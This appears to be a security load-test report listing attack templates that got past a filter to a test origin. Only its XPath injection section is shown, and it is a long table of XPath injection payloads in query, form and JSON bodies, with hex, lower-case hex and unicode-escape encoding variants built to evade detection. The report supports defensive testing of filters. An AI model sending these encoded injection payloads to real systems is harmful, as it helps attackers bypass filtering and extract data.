# Admitted attack variants: 750,000-request run, 2026-10-06

**716 attack templates reached the counted origin, producing 69,676 HTTP 200 responses.** Each listed template reached it in every measured attempt (97 or 98). The origin never executed the payloads.

[Main report](loadtest-750k-variants-2026-10-06.md) | [Complete JSON evidence](loadtest-750k-variants-2026-10-06.json)

The original 67 admitted templates and 649 newly added admitted templates are all listed below. Variations include alternate payload syntax and equivalent transport encodings. A row with no parent is an original template; a parent ending in syntax-family identifies a new curated family seed. Other parent IDs name an actual measured template. None of the admitted generated variants had a refused measured parent.

Targets are the verified wire targets. Bodies preserve their encoded spelling. Full original headers and multipart fields are in each admitted case in the JSON. Header-dependent cases show the relevant field here. Decoding layers, application sinks and path normalization remain application preconditions; admission alone does not show exploitation.

| Category | Admitted templates | Origin requests |
| --- | ---: | ---: |
| XPath injection | 188 | 18,272 |
| HTTP parameter pollution | 142 | 13,800 |
| Remote file inclusion | 108 | 10,518 |
| Command injection | 95 | 9,247 |
| SSRF inputs | 54 | 5,259 |
| Template injection | 39 | 3,800 |
| Java attack indicators | 37 | 3,604 |
| Application probes | 28 | 2,737 |
| Local file inclusion | 14 | 1,361 |
| WordPress paths | 8 | 784 |
| Scanner identifiers | 2 | 196 |
| Protocol/header probes | 1 | 98 |

## XPath injection

| Case | Parent | Variation | Method | Wire target | Body or relevant header | Origin requests |
| --- | --- | --- | --- | --- | --- | ---: |
| ` xpath/syntax-0260 ` | ` xpath/syntax-family ` | ` syntax-00-query ` | GET | ` /api/loadtest/xpath?input=%27+or+true%28%29+or+%27a%27%3D%27b ` | (empty) | 98 |
| ` xpath/syntax-0261 ` | ` xpath/syntax-family ` | ` syntax-00-form ` | POST | ` /api/loadtest/xpath ` | ` input=%27+or+true%28%29+or+%27a%27%3D%27b ` | 98 |
| ` xpath/syntax-0262 ` | ` xpath/syntax-family ` | ` syntax-00-json ` | POST | ` /api/loadtest/xpath ` | ` {"input":"' or true() or 'a'='b"} ` | 98 |
| ` xpath/syntax-0263 ` | ` xpath/syntax-family ` | ` syntax-01-query ` | GET | ` /api/loadtest/xpath?input=%27%09or%09true%28%29%09or%09%27a%27%3D%27b ` | (empty) | 98 |
| ` xpath/syntax-0264 ` | ` xpath/syntax-family ` | ` syntax-01-form ` | POST | ` /api/loadtest/xpath ` | ` input=%27%09or%09true%28%29%09or%09%27a%27%3D%27b ` | 98 |
| ` xpath/syntax-0265 ` | ` xpath/syntax-family ` | ` syntax-01-json ` | POST | ` /api/loadtest/xpath ` | ` {"input":"'\tor\ttrue()\tor\t'a'='b"} ` | 98 |
| ` xpath/syntax-0266 ` | ` xpath/syntax-family ` | ` syntax-02-query ` | GET | ` /api/loadtest/xpath?input=%27+or+%28true%28%29%29+or+%27a%27%3D%27b ` | (empty) | 98 |
| ` xpath/syntax-0267 ` | ` xpath/syntax-family ` | ` syntax-02-form ` | POST | ` /api/loadtest/xpath ` | ` input=%27+or+%28true%28%29%29+or+%27a%27%3D%27b ` | 98 |
| ` xpath/syntax-0268 ` | ` xpath/syntax-family ` | ` syntax-02-json ` | POST | ` /api/loadtest/xpath ` | ` {"input":"' or (true()) or 'a'='b"} ` | 98 |
| ` xpath/syntax-0269 ` | ` xpath/syntax-family ` | ` syntax-03-query ` | GET | ` /api/loadtest/xpath?input=%27+or+count%28%2F%2Fuser%29%3E%3D1+or+%27a%27%3D%27b ` | (empty) | 98 |
| ` xpath/syntax-0270 ` | ` xpath/syntax-family ` | ` syntax-03-form ` | POST | ` /api/loadtest/xpath ` | ` input=%27+or+count%28%2F%2Fuser%29%3E%3D1+or+%27a%27%3D%27b ` | 98 |
| ` xpath/syntax-0271 ` | ` xpath/syntax-family ` | ` syntax-03-json ` | POST | ` /api/loadtest/xpath ` | ` {"input":"' or count(//user)\u003e=1 or 'a'='b"} ` | 98 |
| ` xpath/syntax-0272 ` | ` xpath/syntax-family ` | ` syntax-04-query ` | GET | ` /api/loadtest/xpath?input=%27+or+contains%28name%28%29%2C+%27user%27%29+or+%27a%27%3D%27b ` | (empty) | 98 |
| ` xpath/syntax-0273 ` | ` xpath/syntax-family ` | ` syntax-04-form ` | POST | ` /api/loadtest/xpath ` | ` input=%27+or+contains%28name%28%29%2C+%27user%27%29+or+%27a%27%3D%27b ` | 98 |
| ` xpath/syntax-0274 ` | ` xpath/syntax-family ` | ` syntax-04-json ` | POST | ` /api/loadtest/xpath ` | ` {"input":"' or contains(name(), 'user') or 'a'='b"} ` | 98 |
| ` xpath/syntax-0275 ` | ` xpath/syntax-family ` | ` syntax-05-query ` | GET | ` /api/loadtest/xpath?input=%27+or+not%28false%28%29%29+or+%27a%27%3D%27b ` | (empty) | 98 |
| ` xpath/syntax-0276 ` | ` xpath/syntax-family ` | ` syntax-05-form ` | POST | ` /api/loadtest/xpath ` | ` input=%27+or+not%28false%28%29%29+or+%27a%27%3D%27b ` | 98 |
| ` xpath/syntax-0277 ` | ` xpath/syntax-family ` | ` syntax-05-json ` | POST | ` /api/loadtest/xpath ` | ` {"input":"' or not(false()) or 'a'='b"} ` | 98 |
| ` xpath/syntax-0278 ` | ` xpath/syntax-family ` | ` syntax-06-query ` | GET | ` /api/loadtest/xpath?input=%27%5D%7C%2F%2Fuser%7C%2F%2F%2A%5B%27a%27%3D%27a ` | (empty) | 98 |
| ` xpath/syntax-0279 ` | ` xpath/syntax-family ` | ` syntax-06-form ` | POST | ` /api/loadtest/xpath ` | ` input=%27%5D%7C%2F%2Fuser%7C%2F%2F%2A%5B%27a%27%3D%27a ` | 98 |
| ` xpath/syntax-0280 ` | ` xpath/syntax-family ` | ` syntax-06-json ` | POST | ` /api/loadtest/xpath ` | ` {"input":"']\|//user\|//*['a'='a"} ` | 98 |
| ` xpath/v03-form ` | (original) | (original) | POST | ` /api/xml-search ` | ` input=%27+or+true%28%29+or+%27x%27%3D%27y ` | 98 |
| ` xpath/v03-json ` | (original) | (original) | POST | ` /api/xml-search ` | ` {"input":"' or true() or 'x'='y"} ` | 98 |
| ` xpath/v03-query ` | (original) | (original) | GET | ` /api/xml-search?input=%27+or+true%28%29+or+%27x%27%3D%27y ` | (empty) | 98 |
| ` xpath/v04-form ` | (original) | (original) | POST | ` /api/xml-search ` | ` input=%27+or+count%28%2F%2Fuser%29%3E0+or+%27x%27%3D%27y ` | 98 |
| ` xpath/v04-json ` | (original) | (original) | POST | ` /api/xml-search ` | ` {"input":"' or count(//user)\u003e0 or 'x'='y"} ` | 98 |
| ` xpath/v04-query ` | (original) | (original) | GET | ` /api/xml-search?input=%27+or+count%28%2F%2Fuser%29%3E0+or+%27x%27%3D%27y ` | (empty) | 98 |
| ` xpath/v05-form ` | (original) | (original) | POST | ` /api/xml-search ` | ` input=%27+or+contains%28name%28%29%2C%27user%27%29+or+%27x%27%3D%27y ` | 98 |
| ` xpath/v05-json ` | (original) | (original) | POST | ` /api/xml-search ` | ` {"input":"' or contains(name(),'user') or 'x'='y"} ` | 98 |
| ` xpath/v05-query ` | (original) | (original) | GET | ` /api/xml-search?input=%27+or+contains%28name%28%29%2C%27user%27%29+or+%27x%27%3D%27y ` | (empty) | 98 |
| ` xpath/v09-form ` | (original) | (original) | POST | ` /api/xml-search ` | ` input=%27%5D+%7C+%2F%2Fuser+%7C+%2F%2F%2A%5B%27a%27%3D%27a ` | 98 |
| ` xpath/v09-json ` | (original) | (original) | POST | ` /api/xml-search ` | ` {"input":"'] \| //user \| //*['a'='a"} ` | 98 |
| ` xpath/v09-query ` | (original) | (original) | GET | ` /api/xml-search?input=%27%5D+%7C+%2F%2Fuser+%7C+%2F%2F%2A%5B%27a%27%3D%27a ` | (empty) | 98 |
| ` xpath/v10-form ` | (original) | (original) | POST | ` /api/xml-search ` | ` input=%27+or+not%28false%28%29%29+or+%27x%27%3D%27y ` | 98 |
| ` xpath/v10-json ` | (original) | (original) | POST | ` /api/xml-search ` | ` {"input":"' or not(false()) or 'x'='y"} ` | 98 |
| ` xpath/v10-query ` | (original) | (original) | GET | ` /api/xml-search?input=%27+or+not%28false%28%29%29+or+%27x%27%3D%27y ` | (empty) | 98 |
| ` xpath/variant-02164 ` | ` xpath/v03-query ` | ` query-encoded-name ` | GET | ` /api/xml-search?%69%6E%70%75%74=%27+or+true%28%29+or+%27x%27%3D%27y ` | (empty) | 97 |
| ` xpath/variant-02165 ` | ` xpath/v03-query ` | ` query-encoded-value ` | GET | ` /api/xml-search?input=%27%20%6F%72%20%74%72%75%65%28%29%20%6F%72%20%27%78%27%3D%27%79 ` | (empty) | 97 |
| ` xpath/variant-02166 ` | ` xpath/v03-query ` | ` query-encoded-both ` | GET | ` /api/xml-search?%69%6E%70%75%74=%27%20%6F%72%20%74%72%75%65%28%29%20%6F%72%20%27%78%27%3D%27%79 ` | (empty) | 97 |
| ` xpath/variant-02167 ` | ` xpath/v03-query ` | ` query-lower-hex ` | GET | ` /api/xml-search?%69%6e%70%75%74=%27%20%6f%72%20%74%72%75%65%28%29%20%6f%72%20%27%78%27%3d%27%79 ` | (empty) | 97 |
| ` xpath/variant-02168 ` | ` xpath/v03-query ` | ` query-percent-space ` | GET | ` /api/xml-search?input=%27%20or%20true%28%29%20or%20%27x%27%3D%27y ` | (empty) | 97 |
| ` xpath/variant-02169 ` | ` xpath/v03-form ` | ` form-encoded-name ` | POST | ` /api/xml-search ` | ` %69%6E%70%75%74=%27+or+true%28%29+or+%27x%27%3D%27y ` | 97 |
| ` xpath/variant-02170 ` | ` xpath/v03-form ` | ` form-encoded-value ` | POST | ` /api/xml-search ` | ` input=%27%20%6F%72%20%74%72%75%65%28%29%20%6F%72%20%27%78%27%3D%27%79 ` | 97 |
| ` xpath/variant-02171 ` | ` xpath/v03-form ` | ` form-encoded-both ` | POST | ` /api/xml-search ` | ` %69%6E%70%75%74=%27%20%6F%72%20%74%72%75%65%28%29%20%6F%72%20%27%78%27%3D%27%79 ` | 97 |
| ` xpath/variant-02172 ` | ` xpath/v03-form ` | ` form-lower-hex ` | POST | ` /api/xml-search ` | ` %69%6e%70%75%74=%27%20%6f%72%20%74%72%75%65%28%29%20%6f%72%20%27%78%27%3d%27%79 ` | 97 |
| ` xpath/variant-02173 ` | ` xpath/v03-form ` | ` form-percent-space ` | POST | ` /api/xml-search ` | ` input=%27%20or%20true%28%29%20or%20%27x%27%3D%27y ` | 97 |
| ` xpath/variant-02174 ` | ` xpath/v03-json ` | ` json-unicode-strings ` | POST | ` /api/xml-search ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0027\u0020\u006f\u0072\u0020\u0074\u0072\u0075\u0065\u0028\u0029\u0020\u006f\u0072\u0020\u0027\u0078\u0027\u003d\u0027\u0079"} ` | 97 |
| ` xpath/variant-02175 ` | ` xpath/v03-json ` | ` json-layout-20 ` | POST | ` /api/xml-search ` | ` {\n "input": "' or true() or 'x'='y"\n} ` | 97 |
| ` xpath/variant-02176 ` | ` xpath/v03-json ` | ` json-layout-09 ` | POST | ` /api/xml-search ` | ` {\n\t"input": "' or true() or 'x'='y"\n} ` | 97 |
| ` xpath/variant-02178 ` | ` xpath/v04-query ` | ` query-encoded-name ` | GET | ` /api/xml-search?%69%6E%70%75%74=%27+or+count%28%2F%2Fuser%29%3E0+or+%27x%27%3D%27y ` | (empty) | 97 |
| ` xpath/variant-02179 ` | ` xpath/v04-query ` | ` query-encoded-value ` | GET | ` /api/xml-search?input=%27%20%6F%72%20%63%6F%75%6E%74%28%2F%2F%75%73%65%72%29%3E%30%20%6F%72%20%27%78%27%3D%27%79 ` | (empty) | 97 |
| ` xpath/variant-02180 ` | ` xpath/v04-query ` | ` query-encoded-both ` | GET | ` /api/xml-search?%69%6E%70%75%74=%27%20%6F%72%20%63%6F%75%6E%74%28%2F%2F%75%73%65%72%29%3E%30%20%6F%72%20%27%78%27%3D%27%79 ` | (empty) | 97 |
| ` xpath/variant-02181 ` | ` xpath/v04-query ` | ` query-lower-hex ` | GET | ` /api/xml-search?%69%6e%70%75%74=%27%20%6f%72%20%63%6f%75%6e%74%28%2f%2f%75%73%65%72%29%3e%30%20%6f%72%20%27%78%27%3d%27%79 ` | (empty) | 97 |
| ` xpath/variant-02182 ` | ` xpath/v04-query ` | ` query-percent-space ` | GET | ` /api/xml-search?input=%27%20or%20count%28%2F%2Fuser%29%3E0%20or%20%27x%27%3D%27y ` | (empty) | 97 |
| ` xpath/variant-02183 ` | ` xpath/v04-form ` | ` form-encoded-name ` | POST | ` /api/xml-search ` | ` %69%6E%70%75%74=%27+or+count%28%2F%2Fuser%29%3E0+or+%27x%27%3D%27y ` | 97 |
| ` xpath/variant-02184 ` | ` xpath/v04-form ` | ` form-encoded-value ` | POST | ` /api/xml-search ` | ` input=%27%20%6F%72%20%63%6F%75%6E%74%28%2F%2F%75%73%65%72%29%3E%30%20%6F%72%20%27%78%27%3D%27%79 ` | 97 |
| ` xpath/variant-02185 ` | ` xpath/v04-form ` | ` form-encoded-both ` | POST | ` /api/xml-search ` | ` %69%6E%70%75%74=%27%20%6F%72%20%63%6F%75%6E%74%28%2F%2F%75%73%65%72%29%3E%30%20%6F%72%20%27%78%27%3D%27%79 ` | 97 |
| ` xpath/variant-02186 ` | ` xpath/v04-form ` | ` form-lower-hex ` | POST | ` /api/xml-search ` | ` %69%6e%70%75%74=%27%20%6f%72%20%63%6f%75%6e%74%28%2f%2f%75%73%65%72%29%3e%30%20%6f%72%20%27%78%27%3d%27%79 ` | 97 |
| ` xpath/variant-02187 ` | ` xpath/v04-form ` | ` form-percent-space ` | POST | ` /api/xml-search ` | ` input=%27%20or%20count%28%2F%2Fuser%29%3E0%20or%20%27x%27%3D%27y ` | 97 |
| ` xpath/variant-02188 ` | ` xpath/v04-json ` | ` json-unicode-strings ` | POST | ` /api/xml-search ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0027\u0020\u006f\u0072\u0020\u0063\u006f\u0075\u006e\u0074\u0028\u002f\u002f\u0075\u0073\u0065\u0072\u0029\u003e\u0030\u0020\u006f\u0072\u0020\u0027\u0078\u0027\u003d\u0027\u0079"} ` | 97 |
| ` xpath/variant-02189 ` | ` xpath/v04-json ` | ` json-layout-20 ` | POST | ` /api/xml-search ` | ` {\n "input": "' or count(//user)\u003e0 or 'x'='y"\n} ` | 97 |
| ` xpath/variant-02190 ` | ` xpath/v04-json ` | ` json-layout-09 ` | POST | ` /api/xml-search ` | ` {\n\t"input": "' or count(//user)\u003e0 or 'x'='y"\n} ` | 97 |
| ` xpath/variant-02192 ` | ` xpath/v05-query ` | ` query-encoded-name ` | GET | ` /api/xml-search?%69%6E%70%75%74=%27+or+contains%28name%28%29%2C%27user%27%29+or+%27x%27%3D%27y ` | (empty) | 97 |
| ` xpath/variant-02193 ` | ` xpath/v05-query ` | ` query-encoded-value ` | GET | ` /api/xml-search?input=%27%20%6F%72%20%63%6F%6E%74%61%69%6E%73%28%6E%61%6D%65%28%29%2C%27%75%73%65%72%27%29%20%6F%72%20%27%78%27%3D%27%79 ` | (empty) | 97 |
| ` xpath/variant-02194 ` | ` xpath/v05-query ` | ` query-encoded-both ` | GET | ` /api/xml-search?%69%6E%70%75%74=%27%20%6F%72%20%63%6F%6E%74%61%69%6E%73%28%6E%61%6D%65%28%29%2C%27%75%73%65%72%27%29%20%6F%72%20%27%78%27%3D%27%79 ` | (empty) | 97 |
| ` xpath/variant-02195 ` | ` xpath/v05-query ` | ` query-lower-hex ` | GET | ` /api/xml-search?%69%6e%70%75%74=%27%20%6f%72%20%63%6f%6e%74%61%69%6e%73%28%6e%61%6d%65%28%29%2c%27%75%73%65%72%27%29%20%6f%72%20%27%78%27%3d%27%79 ` | (empty) | 97 |
| ` xpath/variant-02196 ` | ` xpath/v05-query ` | ` query-percent-space ` | GET | ` /api/xml-search?input=%27%20or%20contains%28name%28%29%2C%27user%27%29%20or%20%27x%27%3D%27y ` | (empty) | 97 |
| ` xpath/variant-02197 ` | ` xpath/v05-form ` | ` form-encoded-name ` | POST | ` /api/xml-search ` | ` %69%6E%70%75%74=%27+or+contains%28name%28%29%2C%27user%27%29+or+%27x%27%3D%27y ` | 97 |
| ` xpath/variant-02198 ` | ` xpath/v05-form ` | ` form-encoded-value ` | POST | ` /api/xml-search ` | ` input=%27%20%6F%72%20%63%6F%6E%74%61%69%6E%73%28%6E%61%6D%65%28%29%2C%27%75%73%65%72%27%29%20%6F%72%20%27%78%27%3D%27%79 ` | 97 |
| ` xpath/variant-02199 ` | ` xpath/v05-form ` | ` form-encoded-both ` | POST | ` /api/xml-search ` | ` %69%6E%70%75%74=%27%20%6F%72%20%63%6F%6E%74%61%69%6E%73%28%6E%61%6D%65%28%29%2C%27%75%73%65%72%27%29%20%6F%72%20%27%78%27%3D%27%79 ` | 97 |
| ` xpath/variant-02200 ` | ` xpath/v05-form ` | ` form-lower-hex ` | POST | ` /api/xml-search ` | ` %69%6e%70%75%74=%27%20%6f%72%20%63%6f%6e%74%61%69%6e%73%28%6e%61%6d%65%28%29%2c%27%75%73%65%72%27%29%20%6f%72%20%27%78%27%3d%27%79 ` | 97 |
| ` xpath/variant-02201 ` | ` xpath/v05-form ` | ` form-percent-space ` | POST | ` /api/xml-search ` | ` input=%27%20or%20contains%28name%28%29%2C%27user%27%29%20or%20%27x%27%3D%27y ` | 97 |
| ` xpath/variant-02202 ` | ` xpath/v05-json ` | ` json-unicode-strings ` | POST | ` /api/xml-search ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0027\u0020\u006f\u0072\u0020\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u006e\u0061\u006d\u0065\u0028\u0029\u002c\u0027\u0075\u0073\u0065\u0072\u0027\u0029\u0020\u006f\u0072\u0020\u0027\u0078\u0027\u003d\u0027\u0079"} ` | 97 |
| ` xpath/variant-02203 ` | ` xpath/v05-json ` | ` json-layout-20 ` | POST | ` /api/xml-search ` | ` {\n "input": "' or contains(name(),'user') or 'x'='y"\n} ` | 97 |
| ` xpath/variant-02204 ` | ` xpath/v05-json ` | ` json-layout-09 ` | POST | ` /api/xml-search ` | ` {\n\t"input": "' or contains(name(),'user') or 'x'='y"\n} ` | 97 |
| ` xpath/variant-02248 ` | ` xpath/v09-query ` | ` query-encoded-name ` | GET | ` /api/xml-search?%69%6E%70%75%74=%27%5D+%7C+%2F%2Fuser+%7C+%2F%2F%2A%5B%27a%27%3D%27a ` | (empty) | 97 |
| ` xpath/variant-02249 ` | ` xpath/v09-query ` | ` query-encoded-value ` | GET | ` /api/xml-search?input=%27%5D%20%7C%20%2F%2F%75%73%65%72%20%7C%20%2F%2F%2A%5B%27%61%27%3D%27%61 ` | (empty) | 97 |
| ` xpath/variant-02250 ` | ` xpath/v09-query ` | ` query-encoded-both ` | GET | ` /api/xml-search?%69%6E%70%75%74=%27%5D%20%7C%20%2F%2F%75%73%65%72%20%7C%20%2F%2F%2A%5B%27%61%27%3D%27%61 ` | (empty) | 97 |
| ` xpath/variant-02251 ` | ` xpath/v09-query ` | ` query-lower-hex ` | GET | ` /api/xml-search?%69%6e%70%75%74=%27%5d%20%7c%20%2f%2f%75%73%65%72%20%7c%20%2f%2f%2a%5b%27%61%27%3d%27%61 ` | (empty) | 97 |
| ` xpath/variant-02252 ` | ` xpath/v09-query ` | ` query-percent-space ` | GET | ` /api/xml-search?input=%27%5D%20%7C%20%2F%2Fuser%20%7C%20%2F%2F%2A%5B%27a%27%3D%27a ` | (empty) | 97 |
| ` xpath/variant-02253 ` | ` xpath/v09-form ` | ` form-encoded-name ` | POST | ` /api/xml-search ` | ` %69%6E%70%75%74=%27%5D+%7C+%2F%2Fuser+%7C+%2F%2F%2A%5B%27a%27%3D%27a ` | 97 |
| ` xpath/variant-02254 ` | ` xpath/v09-form ` | ` form-encoded-value ` | POST | ` /api/xml-search ` | ` input=%27%5D%20%7C%20%2F%2F%75%73%65%72%20%7C%20%2F%2F%2A%5B%27%61%27%3D%27%61 ` | 97 |
| ` xpath/variant-02255 ` | ` xpath/v09-form ` | ` form-encoded-both ` | POST | ` /api/xml-search ` | ` %69%6E%70%75%74=%27%5D%20%7C%20%2F%2F%75%73%65%72%20%7C%20%2F%2F%2A%5B%27%61%27%3D%27%61 ` | 97 |
| ` xpath/variant-02256 ` | ` xpath/v09-form ` | ` form-lower-hex ` | POST | ` /api/xml-search ` | ` %69%6e%70%75%74=%27%5d%20%7c%20%2f%2f%75%73%65%72%20%7c%20%2f%2f%2a%5b%27%61%27%3d%27%61 ` | 97 |
| ` xpath/variant-02257 ` | ` xpath/v09-form ` | ` form-percent-space ` | POST | ` /api/xml-search ` | ` input=%27%5D%20%7C%20%2F%2Fuser%20%7C%20%2F%2F%2A%5B%27a%27%3D%27a ` | 97 |
| ` xpath/variant-02258 ` | ` xpath/v09-json ` | ` json-unicode-strings ` | POST | ` /api/xml-search ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0027\u005d\u0020\u007c\u0020\u002f\u002f\u0075\u0073\u0065\u0072\u0020\u007c\u0020\u002f\u002f\u002a\u005b\u0027\u0061\u0027\u003d\u0027\u0061"} ` | 97 |
| ` xpath/variant-02259 ` | ` xpath/v09-json ` | ` json-layout-20 ` | POST | ` /api/xml-search ` | ` {\n "input": "'] \| //user \| //*['a'='a"\n} ` | 97 |
| ` xpath/variant-02260 ` | ` xpath/v09-json ` | ` json-layout-09 ` | POST | ` /api/xml-search ` | ` {\n\t"input": "'] \| //user \| //*['a'='a"\n} ` | 97 |
| ` xpath/variant-02262 ` | ` xpath/v10-query ` | ` query-encoded-name ` | GET | ` /api/xml-search?%69%6E%70%75%74=%27+or+not%28false%28%29%29+or+%27x%27%3D%27y ` | (empty) | 97 |
| ` xpath/variant-02263 ` | ` xpath/v10-query ` | ` query-encoded-value ` | GET | ` /api/xml-search?input=%27%20%6F%72%20%6E%6F%74%28%66%61%6C%73%65%28%29%29%20%6F%72%20%27%78%27%3D%27%79 ` | (empty) | 97 |
| ` xpath/variant-02264 ` | ` xpath/v10-query ` | ` query-encoded-both ` | GET | ` /api/xml-search?%69%6E%70%75%74=%27%20%6F%72%20%6E%6F%74%28%66%61%6C%73%65%28%29%29%20%6F%72%20%27%78%27%3D%27%79 ` | (empty) | 97 |
| ` xpath/variant-02265 ` | ` xpath/v10-query ` | ` query-lower-hex ` | GET | ` /api/xml-search?%69%6e%70%75%74=%27%20%6f%72%20%6e%6f%74%28%66%61%6c%73%65%28%29%29%20%6f%72%20%27%78%27%3d%27%79 ` | (empty) | 97 |
| ` xpath/variant-02266 ` | ` xpath/v10-query ` | ` query-percent-space ` | GET | ` /api/xml-search?input=%27%20or%20not%28false%28%29%29%20or%20%27x%27%3D%27y ` | (empty) | 97 |
| ` xpath/variant-02267 ` | ` xpath/v10-form ` | ` form-encoded-name ` | POST | ` /api/xml-search ` | ` %69%6E%70%75%74=%27+or+not%28false%28%29%29+or+%27x%27%3D%27y ` | 97 |
| ` xpath/variant-02268 ` | ` xpath/v10-form ` | ` form-encoded-value ` | POST | ` /api/xml-search ` | ` input=%27%20%6F%72%20%6E%6F%74%28%66%61%6C%73%65%28%29%29%20%6F%72%20%27%78%27%3D%27%79 ` | 97 |
| ` xpath/variant-02269 ` | ` xpath/v10-form ` | ` form-encoded-both ` | POST | ` /api/xml-search ` | ` %69%6E%70%75%74=%27%20%6F%72%20%6E%6F%74%28%66%61%6C%73%65%28%29%29%20%6F%72%20%27%78%27%3D%27%79 ` | 97 |
| ` xpath/variant-02270 ` | ` xpath/v10-form ` | ` form-lower-hex ` | POST | ` /api/xml-search ` | ` %69%6e%70%75%74=%27%20%6f%72%20%6e%6f%74%28%66%61%6c%73%65%28%29%29%20%6f%72%20%27%78%27%3d%27%79 ` | 97 |
| ` xpath/variant-02271 ` | ` xpath/v10-form ` | ` form-percent-space ` | POST | ` /api/xml-search ` | ` input=%27%20or%20not%28false%28%29%29%20or%20%27x%27%3D%27y ` | 97 |
| ` xpath/variant-02272 ` | ` xpath/v10-json ` | ` json-unicode-strings ` | POST | ` /api/xml-search ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0027\u0020\u006f\u0072\u0020\u006e\u006f\u0074\u0028\u0066\u0061\u006c\u0073\u0065\u0028\u0029\u0029\u0020\u006f\u0072\u0020\u0027\u0078\u0027\u003d\u0027\u0079"} ` | 97 |
| ` xpath/variant-02273 ` | ` xpath/v10-json ` | ` json-layout-20 ` | POST | ` /api/xml-search ` | ` {\n "input": "' or not(false()) or 'x'='y"\n} ` | 97 |
| ` xpath/variant-02274 ` | ` xpath/v10-json ` | ` json-layout-09 ` | POST | ` /api/xml-search ` | ` {\n\t"input": "' or not(false()) or 'x'='y"\n} ` | 97 |
| ` xpath/variant-03842 ` | ` xpath/syntax-0260 ` | ` query-encoded-name ` | GET | ` /api/loadtest/xpath?%69%6E%70%75%74=%27+or+true%28%29+or+%27a%27%3D%27b ` | (empty) | 97 |
| ` xpath/variant-03843 ` | ` xpath/syntax-0260 ` | ` query-encoded-value ` | GET | ` /api/loadtest/xpath?input=%27%20%6F%72%20%74%72%75%65%28%29%20%6F%72%20%27%61%27%3D%27%62 ` | (empty) | 97 |
| ` xpath/variant-03844 ` | ` xpath/syntax-0260 ` | ` query-encoded-both ` | GET | ` /api/loadtest/xpath?%69%6E%70%75%74=%27%20%6F%72%20%74%72%75%65%28%29%20%6F%72%20%27%61%27%3D%27%62 ` | (empty) | 97 |
| ` xpath/variant-03845 ` | ` xpath/syntax-0260 ` | ` query-lower-hex ` | GET | ` /api/loadtest/xpath?%69%6e%70%75%74=%27%20%6f%72%20%74%72%75%65%28%29%20%6f%72%20%27%61%27%3d%27%62 ` | (empty) | 97 |
| ` xpath/variant-03846 ` | ` xpath/syntax-0260 ` | ` query-percent-space ` | GET | ` /api/loadtest/xpath?input=%27%20or%20true%28%29%20or%20%27a%27%3D%27b ` | (empty) | 97 |
| ` xpath/variant-03847 ` | ` xpath/syntax-0261 ` | ` form-encoded-name ` | POST | ` /api/loadtest/xpath ` | ` %69%6E%70%75%74=%27+or+true%28%29+or+%27a%27%3D%27b ` | 97 |
| ` xpath/variant-03848 ` | ` xpath/syntax-0261 ` | ` form-encoded-value ` | POST | ` /api/loadtest/xpath ` | ` input=%27%20%6F%72%20%74%72%75%65%28%29%20%6F%72%20%27%61%27%3D%27%62 ` | 97 |
| ` xpath/variant-03849 ` | ` xpath/syntax-0261 ` | ` form-encoded-both ` | POST | ` /api/loadtest/xpath ` | ` %69%6E%70%75%74=%27%20%6F%72%20%74%72%75%65%28%29%20%6F%72%20%27%61%27%3D%27%62 ` | 97 |
| ` xpath/variant-03850 ` | ` xpath/syntax-0261 ` | ` form-lower-hex ` | POST | ` /api/loadtest/xpath ` | ` %69%6e%70%75%74=%27%20%6f%72%20%74%72%75%65%28%29%20%6f%72%20%27%61%27%3d%27%62 ` | 97 |
| ` xpath/variant-03851 ` | ` xpath/syntax-0261 ` | ` form-percent-space ` | POST | ` /api/loadtest/xpath ` | ` input=%27%20or%20true%28%29%20or%20%27a%27%3D%27b ` | 97 |
| ` xpath/variant-03852 ` | ` xpath/syntax-0262 ` | ` json-unicode-strings ` | POST | ` /api/loadtest/xpath ` | ` {"\u0069\u006e\u0070\u0075\u0074":"\u0027\u0020\u006f\u0072\u0020\u0074\u0072\u0075\u0065\u0028\u0029\u0020\u006f\u0072\u0020\u0027\u0061\u0027\u003d\u0027\u0062"} ` | 97 |
| ` xpath/variant-03853 ` | ` xpath/syntax-0262 ` | ` json-layout-20 ` | POST | ` /api/loadtest/xpath ` | ` {\n "input": "' or true() or 'a'='b"\n} ` | 97 |
| ` xpath/variant-03854 ` | ` xpath/syntax-0262 ` | ` json-layout-09 ` | POST | ` /api/loadtest/xpath ` | ` {\n\t"input": "' or true() or 'a'='b"\n} ` | 97 |
| ` xpath/variant-03855 ` | ` xpath/syntax-0263 ` | ` query-encoded-name ` | GET | ` /api/loadtest/xpath?%69%6E%70%75%74=%27%09or%09true%28%29%09or%09%27a%27%3D%27b ` | (empty) | 97 |
| ` xpath/variant-03856 ` | ` xpath/syntax-0263 ` | ` query-encoded-value ` | GET | ` /api/loadtest/xpath?input=%27%09%6F%72%09%74%72%75%65%28%29%09%6F%72%09%27%61%27%3D%27%62 ` | (empty) | 97 |
| ` xpath/variant-03857 ` | ` xpath/syntax-0263 ` | ` query-encoded-both ` | GET | ` /api/loadtest/xpath?%69%6E%70%75%74=%27%09%6F%72%09%74%72%75%65%28%29%09%6F%72%09%27%61%27%3D%27%62 ` | (empty) | 97 |
| ` xpath/variant-03858 ` | ` xpath/syntax-0263 ` | ` query-lower-hex ` | GET | ` /api/loadtest/xpath?%69%6e%70%75%74=%27%09%6f%72%09%74%72%75%65%28%29%09%6f%72%09%27%61%27%3d%27%62 ` | (empty) | 97 |
| ` xpath/variant-03859 ` | ` xpath/syntax-0264 ` | ` form-encoded-name ` | POST | ` /api/loadtest/xpath ` | ` %69%6E%70%75%74=%27%09or%09true%28%29%09or%09%27a%27%3D%27b ` | 97 |
| ` xpath/variant-03860 ` | ` xpath/syntax-0264 ` | ` form-encoded-value ` | POST | ` /api/loadtest/xpath ` | ` input=%27%09%6F%72%09%74%72%75%65%28%29%09%6F%72%09%27%61%27%3D%27%62 ` | 97 |
| ` xpath/variant-03861 ` | ` xpath/syntax-0264 ` | ` form-encoded-both ` | POST | ` /api/loadtest/xpath ` | ` %69%6E%70%75%74=%27%09%6F%72%09%74%72%75%65%28%29%09%6F%72%09%27%61%27%3D%27%62 ` | 97 |
| ` xpath/variant-03862 ` | ` xpath/syntax-0264 ` | ` form-lower-hex ` | POST | ` /api/loadtest/xpath ` | ` %69%6e%70%75%74=%27%09%6f%72%09%74%72%75%65%28%29%09%6f%72%09%27%61%27%3d%27%62 ` | 97 |
